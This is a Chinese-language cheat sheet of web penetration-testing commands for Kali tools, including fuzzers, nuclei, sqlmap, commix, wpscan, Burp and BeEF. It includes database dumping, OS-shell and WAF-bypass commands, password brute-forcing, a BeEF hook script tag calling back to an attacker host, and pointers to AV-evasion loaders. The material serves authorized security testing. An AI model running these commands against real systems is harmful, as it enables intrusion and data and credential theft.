# Web 渗透
针对 Web 应用的目录/子域模糊测试、参数发现、漏洞扫描、注入利用与 CMS 审计工具速查。
需联网的工具(模板更新、漏洞库查询)可先设代理:
`export http_proxy=http://10.211.55.2:2334 https_proxy=http://10.211.55.2:2334`

本文件工具:ffuf、feroxbuster、gobuster、dirsearch、wfuzz、arjun、nuclei、nikto、whatweb、sqlmap、dalfox、commix、wpscan、burpsuite、beef-xss

---

## ffuf — 高速 Web 模糊测试(目录/子域/参数/POST 通用)

来源:apt 包 ffuf

```bash
# 目录/文件模糊测试(-ac 自动校准,过滤通配符误报)
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<目标IP>/FUZZ -ac

# 递归 + 多扩展名扫描,并按固定响应大小过滤垃圾结果
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
     -u http://<目标IP>/FUZZ -recursion -recursion-depth 2 \
     -e .php,.html,.bak -fs <固定响应大小>

# 子域爆破(多线程,只保留常见有效状态码)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://FUZZ.<域名> -mc 200,301,302,403 -t 50

# 隐藏参数发现:先记录无参数时的响应大小,再按大小过滤
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "http://<目标IP>/page.php?FUZZ=1" -fs <无参数时响应大小> -ac
```

参数速查:
- `-w <字典>` — 指定字典,可用 `-w 字典:别名` 区分多个 FUZZ 位
- `-u <URL>` — 目标 URL,字典内容替换 FUZZ 占位符
- `-mc <状态码>` — 只匹配指定状态码(如 200,301)
- `-fc <状态码>` — 排除指定状态码(如 403,404)
- `-fs <大小>` — 按响应大小(byte)过滤结果
- `-ms <大小>` — 只保留匹配指定大小的响应
- `-ac` — 自动校准,识别并过滤通配符/自签名响应
- `-recursion` / `-recursion-depth <n>` — 递归扫描 / 递归深度
- `-e <扩展名列表>` — 为每个词追加扩展名(如 .php,.bak)
- `-t <线程>` — 并发线程数,默认 40

注意:大字典全线程打小目标易触发 WAF/限速,可加 `-rate <每秒请求数>` 限流;结果可用 `-o 文件 -of json` 保存。

---

## feroxbuster — Rust 编写的递归目录/文件爆破工具

来源:apt 包 feroxbuster

```bash
# 快速扫描:跳过证书校验 + 随机 UA(内置默认字典)
feroxbuster -u http://<目标IP> -k -A

# 指定字典 + 递归深度 + 多扩展名 + 按大小过滤
feroxbuster -u http://<目标IP> \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  --depth 2 -e php,html,bak --filter-size <固定响应大小>

# 只保留指定状态码且不递归(轻量探测)
feroxbuster -u http://<目标IP> -s 200 301 302 -n
```

参数速查:
- `-u <URL>` — 目标 URL
- `-w <字典>` — 字典路径(默认内置 common.txt)
- `-d / --depth <n>` — 递归深度
- `-e / --extensions` — 附加扩展名(如 php,html,bak)
- `-n / --no-recursion` — 关闭递归
- `-s / --status-codes` — 只保留指定状态码
- `--filter-size` — 按响应大小过滤
- `--filter-status` — 按状态码过滤
- `-A` — 随机 User-Agent
- `-k` — 跳过 TLS 证书校验

注意:默认就递归(depth 4),大字典时注意请求量;`--extract-links` 可从返回页面提取链接再探测。

---

## gobuster — 目录/DNS/虚拟主机爆破工具

来源:apt 包 gobuster

```bash
# 目录/文件爆破(字典 + 多扩展名)
gobuster dir -u http://<目标IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50

# DNS 子域爆破
gobuster dns -d <域名> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# 虚拟主机(vhost)枚举,验证 Host 头碰撞发现的内站
gobuster vhost -u http://<目标IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

# 目录爆破排除指定响应长度(通配符站点),静默模式输出结果
gobuster dir -u http://<目标IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt --exclude-length <固定响应长度> -q
```

参数速查:
- `dir / dns / vhost / fuzz` — 子命令:目录、DNS、虚拟主机、任意模糊测试
- `-u <URL>` — 目标(dir/vhost 用)
- `-d <域名>` — 目标域名(dns 用)
- `-w <字典>` — 字典路径
- `-x <扩展名列表>` — 每个词追加的扩展名
- `-t <线程>` — 并发线程数
- `-k` — 跳过 TLS 证书校验
- `--append-domain` — vhost 模式把词追加到主域
- `--exclude-length` — 排除指定响应长度(应对通配符)
- `-q` — 静默模式,只输出结果

注意:gobuster 面向"状态码判断",遇到全 200 的通配符站点必须用 `--exclude-length` 过滤;vhost 命中不代表可直接访问,需配合 Host 头验证。

---

## dirsearch — 易用的 Web 路径扫描器(默认递归字典体验好)

来源:apt 包 dirsearch

```bash
# 常用扩展名递归扫描
dirsearch -u http://<目标IP> -e php,html,js -r -R 2 -t 30 --random-agent

# 自定义字典 + 只保留有效状态码
dirsearch -u http://<目标IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -i 200,301,302

# 备份文件专项 + 强制扩展名模式 + 结果输出
dirsearch -u http://<目标IP>/upload -e bak,zip,tar.gz -f -o /tmp/dirsearch.txt
```

参数速查:
- `-u <URL>` — 目标 URL
- `-w <字典>` — 自定义字典(默认内置)
- `-e <扩展名>` — 扫描扩展名(如 php,html,bak)
- `-f` — 强制扩展名模式,对每个词追加 -e 的扩展名
- `-r` — 开启递归扫描
- `-R <n>` — 递归深度
- `-t <n>` — 线程数
- `--random-agent` — 每次随机 User-Agent
- `-i <状态码>` — 只显示指定状态码
- `-o <文件>` — 输出结果到文件

注意:默认字典覆盖常见框架路径,配合 `-e` 才会拼扩展名;目标为 ASP/JSP 时记得换对应扩展名(asp,aspx,jsp,do)。

---

## wfuzz — 老牌 Web 模糊测试器(多字典交叉、过滤灵活)

来源:apt 包 wfuzz

```bash
# 目录模糊测试,隐藏 404
wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://<目标IP>/FUZZ

# 双字典交叉:路径名 × 扩展名(FUZ2Z 是第二个字典的占位符)
wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
      -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt \
      --hc 404 http://<目标IP>/FUZZ.FUZ2Z

# POST 参数模糊测试,按隐藏响应字符数过滤误报
wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
      -d "FUZZ=test&user=admin" --hh <基准字符数> http://<目标IP>/login.php
```

参数速查:
- `-w <字典>` — 等价 `-z file,字典`,多字典时占位符依次为 FUZZ/FUZ2Z/FUZ3Z
- `-z <payload>` — 指定 payload(如 file,字典 / range,0-100)
- `--hc <状态码>` — 隐藏指定状态码的响应
- `--hl / --hw / --hh` — 按行数/词数/字符数隐藏响应
- `-H <头>` — 添加请求头(如 `-H "X-Forwarded-For: 127.0.0.1"`)
- `-b <cookie>` — 设置 Cookie
- `-d <数据>` — POST 数据体(内嵌 FUZZ 占位)
- `-t <线程>` — 线程数

注意:Python3 版 wfuzz 对部分老旧站点兼容性一般,复杂场景可换 ffuf;官方 wiki 的高级用法(EFuzz、编码器)值得翻一遍。

---

## arjun — HTTP 隐藏参数(GET/POST/JSON)发现工具

来源:apt 包 arjun

```bash
# GET 请求探测隐藏参数
arjun -u "http://<目标IP>/api/user"

# POST / JSON 接口探测
arjun -u "http://<目标IP>/api/login" -m POST
arjun -u "http://<目标IP>/api/query" -m JSON

# 结果存 JSON + 提高线程(稳定目标适用)
arjun -u "http://<目标IP>/api/user" -t 10 -o /tmp/arjun.json
```

参数速查:
- `-u / --url` — 目标 URL
- `-m / --method` — 请求方式 GET/POST/JSON/XML
- `-o / --output` — 输出 JSON 结果文件
- `-t / --threads` — 并发线程
- `--include` — 追加测试常见参数(如 debug、test)
- `--stable` — 单请求模式,对付不稳定目标/WAF
- `--delay` — 请求间延时(秒)

注意:发现参数后优先测值注入(debug=1、admin=true、path=../../);API 优先用 `-m JSON`,很多隐藏参数只在 JSON 体里生效。

---

## nuclei — 基于 YAML 模板的高速漏洞扫描器

来源:apt 包 nuclei(模板包 apt: nuclei-templates,或联网自更新至 ~/nuclei-templates/)

```bash
# 联网更新模板库(需先设代理)
export https_proxy=http://10.211.55.2:2334 && nuclei -update-templates

# 单目标高危扫描
nuclei -u http://<目标IP> -severity critical,high -o /tmp/nuclei-high.txt

# 批量目标 + 按标签过滤(-l 接 URL 列表文件)
nuclei -l /tmp/targets.txt -tags cve,misconfig,exposure -c 50 -rl 100

# 离线模板:使用 apt 安装的模板目录定向扫(如 WordPress)
nuclei -u http://<目标IP> -t /usr/share/nuclei-templates/http/cves/ -silent
```

参数速查:
- `-u <URL>` — 单个目标
- `-l <文件>` — URL 列表文件(批量)
- `-t <目录/文件>` — 指定模板路径
- `-tags <标签>` — 按标签过滤(cve、exposure、rce、wp-plugin 等)
- `-severity` — 按危险级过滤(info/low/medium/high/critical,可逗号组合)
- `-o <文件>` — 结果输出文件
- `-silent` — 只输出命中结果
- `-c <n>` — 并发模板数,`-rl <n>` 每秒请求限速
- `-proxy <代理>` — 经代理发送(如 Burp)

注意:全量模板对目标压力较大,实战先 `-tags exposure,misconfig` 再定向 `-tags cve`;模板库要常更新,APT 版模板可能滞后。
衔接:`-severity` 过滤调用已入执行台场景矩阵/命令库(00 号 console.sh);漏扫命中高危后按 10 号 Runbook 的阶段推进。

---

## nikto — 经典 Web 服务器漏洞/配置扫描器

来源:apt 包 nikto

```bash
# 基础扫描(默认全插件)
nikto -h http://<目标IP>

# 多端口 + HTML 报告输出
nikto -h <目标IP> -p 80,443,8080 -o /tmp/nikto.html -Format htm

# 经 Burp 代理重放,便于抓包分析
nikto -h http://<目标IP> -useproxy http://127.0.0.1:8080

# 指定调优类别:1 有趣文件 2 配置错误 3 信息泄露
nikto -h http://<目标IP> -Tuning 1,2,3
```

参数速查:
- `-h <主机>` — 目标(可带 http:// 前缀)
- `-p <端口>` — 端口,逗号分隔多个
- `-ssl` — 强制 SSL 模式
- `-o <文件> -Format` — 输出报告(htm/csv/xml/txt)
- `-Tuning <编号>` — 调优测试类别(1-9,x)
- `-useproxy <代理>` — 全部请求走代理
- `-id 用户:密码` — HTTP Basic 认证
- `-evasion <编号>` — IDS 规避技术(1-9)
- `-timeout <秒>` — 单请求超时

注意:nikto 请求特征明显,极易触发告警,红队慎直接打生产;报的很多是版本陈旧类"漏洞",需人工确认可利用性。

---

## whatweb — Web 指纹识别(CMS/框架/中间件/库)

来源:apt 包 whatweb

```bash
# 基础指纹识别
whatweb http://<目标IP>

# 激进模式(更深入,会访问 robots.txt 等更多路径)+ 详细输出
whatweb -a 3 -v http://<域名>

# 批量识别 URL 列表
whatweb -i /tmp/urls.txt --log-brief /tmp/whatweb.txt
```

参数速查:
- `-a <0-4>` — 侵略性等级,3 常用,4 最强(易触发告警)
- `-v` — 详细输出(显示每个插件的匹配内容)
- `-i <文件>` — 从文件批量读 URL
- `--log-brief <文件>` — 简要结果写文件
- `-l` — 列出全部内置插件
- `--no-errors` — 忽略错误,批量时不中断

注意:先指纹后渗透,结果决定后续用 nuclei 模板、wpscan 还是 cms 专项 EXP;`-a 4` 会做更重的探测,代理/内网环境慎用。

---

## sqlmap — SQL 注入自动化检测与利用

来源:apt 包 sqlmap

```bash
# 基础注入检测:带参数 URL + 批处理 + 随机 UA
sqlmap -u "http://<目标IP>/news.php?id=1" --batch --random-agent

# 漏报时提升 level/risk 并枚举所有数据库
sqlmap -u "http://<目标IP>/news.php?id=1" --batch --level 5 --risk 3 --dbs

# 用 Burp 保存的请求文件(自动带全量请求头/Cookie),表单页面可加 --forms
sqlmap -r /tmp/request.txt --batch --threads 5
sqlmap -u "http://<目标IP>/search.php" --forms --batch

# 脱库 + 交互式 OS Shell + tamper 绕 WAF
sqlmap -r /tmp/request.txt -D <库名> -T <表名> --dump --batch
sqlmap -r /tmp/request.txt --os-shell --tamper=space2comment,between --random-agent
```

参数速查:
- `-u <URL>` — 带(可疑)参数的目标 URL
- `-r <请求文件>` — 从 Burp/浏览器导出的原始请求文件
- `-p <参数>` — 只测指定参数
- `--data <数据>` — POST 数据体
- `--dbs / --tables / --columns` — 枚举库/表/列
- `--dump` — 导出数据(`-D 库 -T 表` 定向脱库)
- `--os-shell` — 拿到 SQLi 后尝试交互式系统 Shell
- `--tamper=<脚本>` — 混淆脚本绕 WAF(如 space2comment、between)
- `--level <1-5> / --risk <1-3>` — 测试广度/风险等级
- `--batch` — 全程默认选择,非交互运行

注意:优先 `-r` 带完整 Cookie/头,登录后页面注入常因会话失效漏检;高 level 会写入数据库,取证环境慎用;`--flush-session` 避免读到旧结果。

---

## dalfox — XSS 快速扫描与验证工具

来源:apt 包 dalfox

```bash
# URL 扫描(自动从 URL 提取参数逐个测试)
dalfox url "http://<目标IP>/search.php?q=test" --follow-redirects

# 指定参数 + 盲 XSS 回连(填 Burp Collaborator / 自建接收端)
dalfox url "http://<目标IP>/profile.php?name=x" -p name --blind <回连接收端点>

# 管道模式批量扫,忽略 404/403 目标
cat /tmp/urls.txt | dalfox pipe --ignore-return 404,403
```

参数速查:
- `url <URL>` / `pipe` — 子命令:单目标 / 从 stdin 批量读
- `-p <参数>` — 只测指定参数
- `--blind <端点>` — 盲 XSS 回连地址
- `-d / --data` — POST 数据体
- `--header <头>` — 自定义请求头(带 Cookie 等)
- `--follow-redirects` — 跟随重定向
- `--ignore-return <状态码>` — 忽略指定响应码
- `-o <文件>` — 结果输出文件

注意:验证 XSS 前先看输出中的 PoC 请求是否真弹(`alert` 类);盲打记得把 hook 指向能收到请求的端点,内网目标可用交互式工具接力。

---

## commix — 命令注入(OS Command Injection)自动化检测与利用

来源:apt 包 commix

```bash
# GET 参数命令注入检测,--batch 自动进入 os-shell 交互
commix -u "http://<目标IP>/ping.php?ip=127.0.0.1" --batch

# POST 数据目标
commix -u "http://<目标IP>/api/exec" --data "host=127.0.0.1&cmd=ping" --batch

# 用 Burp 请求文件 + 指定参数 + 走代理观察流量
commix -r /tmp/request.txt -p ip --proxy http://127.0.0.1:8080 --batch
```

参数速查:
- `-u / --url` — 带(可疑)参数的目标 URL
- `-r <请求文件>` — 原始请求文件
- `--data <数据>` — POST 数据体
- `-p <参数>` — 只测指定参数
- `--cookie` — 设置 Cookie(登录态测试)
- `--random-agent` — 随机 User-Agent
- `--proxy <代理>` — 请求走代理
- `--batch` — 非交互默认选择
- `--delay <秒>` — 请求延时,对付时间盲注验证与限速
- `--file-write/--file-dest` — 确认注入后向目标写文件

注意:拿到 os-shell 后先 `id`/`whoami` 确认身份,再决定是否上传马;会真实执行系统命令,业务环境先授权。

---

## wpscan — WordPress 专项审计(用户/插件/主题/口令)

来源:apt 包 wpscan(漏洞数据联网比对需 API Token,https://wpscan.com 免费注册)

```bash
# 全量枚举:用户、全部插件、全部主题、配置备份、导出数据库
wpscan --url http://<目标IP>/wp/ --api-token <token> --enumerate u,ap,at,cb,dbe -t 30

# 密码爆破(rockyou 是 gzip,需先解压)
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
wpscan --url http://<目标IP>/wp/ -U admin -P /usr/share/wordlists/rockyou.txt

# 敏感模式:随机 UA + 低速,降低被封概率
wpscan --url http://<目标IP>/wp/ --enumerate u --stealthy --random-user-agent
```

参数速查:
- `--url <URL>` — WordPress 站点地址(可指向子目录)
- `--enumerate <项>` — 枚举:u 用户、p/ap 插件、t/at 主题、cb 配置备份、dbe 数据库导出、tt timthumb
- `--api-token <token>` — 联网查插件 CVE 漏洞库(必须,否则只列版本)
- `-U <用户>` / `-P <字典>` — 口令爆破:用户名/密码字典
- `-t <线程>` — 并发线程
- `--stealthy` — 低速敏感模式
- `--random-user-agent` — 随机 UA
- `--plugins-detection` — 插件检测强度(passive/aggressive)
- `--wp-content-dir <路径>` — 指定 wp-content 路径(改名站点)

注意:先确认目标真是 WordPress 再扫;枚举出来的过时插件去 wpscan/CVE 库人工找 EXP;爆破前先枚举用户名或用 xmlrpc 放大。

---

## burpsuite — Web 渗透测试代理平台(拦截/重放/爆破)

来源:apt 包 burpsuite(Kali 自带,社区版)

启动方式(文字步骤):
1. 终端运行 `burpsuite`,或应用程序菜单 → "Web Application Analysis" → Burp Suite;首次启动选临时项目(Temporary project)。
2. Proxy 模块默认监听 `127.0.0.1:8080`,浏览器(Firefox 网络设置或 FoxyProxy 插件)HTTP/HTTPS 代理指向该地址。
3. 浏览器访问 `http://burp` 下载 CA 证书并在浏览器受信根证书中导入,否则 HTTPS 流量无法解密。
4. 访问目标站点,Proxy → Intercept 拦截请求,Forward 放行 / Drop 丢弃。

常用模块说明(参数速查):
- `Proxy` — 拦截/查看/修改浏览器与目标间的 HTTP(S) 流量
- `Target/Site map` — 按站点自动归档所有经过代理的请求与响应
- `Repeater` — 手工修改请求并反复重放,是手工测试核心
- `Intruder` — 对请求参数做批量模糊/爆破(社区版限速)
- `Decoder/Comparer` — 编解码转换、两次响应差异比对
- `Sequencer` — 分析 Cookie/Token 随机性

注意:社区版无自动化扫描(Scanner/Dast 为 Pro 功能);其他工具流量想进 Burp 就把代理指向 127.0.0.1:8080(如 sqlmap -r 直接用其抓包文件、nikto -useproxy、ffuf -x)。

---

## beef-xss — 浏览器利用框架(XSS hook 后持久控制)

来源:apt 包 beef-xss(服务型工具:面板/hook 服务常驻 3000 端口)

启动与使用步骤(文字步骤,勿当一次性命令行工具用):
1. 终端运行 `beef-xss` 首次会引导设置面板口令,并以 systemd 服务 `beef-xss.service` 常驻运行(之后由该服务管理启停)。
2. 启动后浏览器自动打开控制面板 `http://127.0.0.1:3000/ui/panel`,默认账号 `beef / beef`(凭据与端口在 `/etc/beef-xss/config.yaml` 修改,首次务必改默认口令)。
3. hook 地址为 `http://<攻击机IP>:3000/hook.js`,在已发现的 XSS 点插入引用即可上钩:
   `<script src="http://<攻击机IP>:3000/hook.js"></script>`
4. 目标浏览器执行后出现在面板 Online Browsers 列表,可用 Commands 模块(凭据窃取、内网探测、社工跳转等)。

参数速查(配置要点):
- `面板地址` — http://127.0.0.1:3000/ui/panel
- `hook 地址` — http://<攻击机IP>:3000/hook.js(payload 引用它)
- `配置文件` — /etc/beef-xss/config.yaml(口令、监听 IP/端口)
- `服务管理` — systemctl start/stop/status beef-xss.service
- `默认凭据` — beef / beef(必须修改)

注意:服务型工具,面板与 hook 端口常驻,渗透结束记得停服务;目标必须能回连攻击机 3000 端口,隔离网/出网受限环境需先打通链路(可配合 ligolo 转发);hook 流量明文易被 EDR 捕获。

---

## 与新体系的衔接

| 本文件主题 | 后期文档深化 | TRICKS 相关条 |
|---|---|---|
| 漏扫产出(nuclei 高危优先) | 10 号阶段 1「域外,无凭据(初始立足)」:Web 侧命中直接进 Runbook 推进 | — |
| 登录表单爆破 → 域口令喷洒 | 10 号阶段 1.4「密码喷洒」(先探锁定阈值再喷) | 「账号锁死不敢动→--pass-pol/spray-safe」 |
| OWA/EWS 面板路径与爆破 | 15 号:OWA 喷洒(msf owa_login)、ruler 规则攻击、ProxyLogon/ProxyShell/ProxyNotShell RCE 链 | 「Exchange 443 暴露→Proxy 系全家桶」 |
| Burp 之外的 MITM/重放平台 | 20 号 Yakit(MITM 劫持、Web Fuzzer、DNSLog,本机 AppImage) | — |
| Web shell 后的载荷落地 | 20 号 Shhhloader(免杀加载器);13 号 LOLBins 传文件路线 | 「命令能跑但落地就报毒→LOLBins/Shhhloader」 |
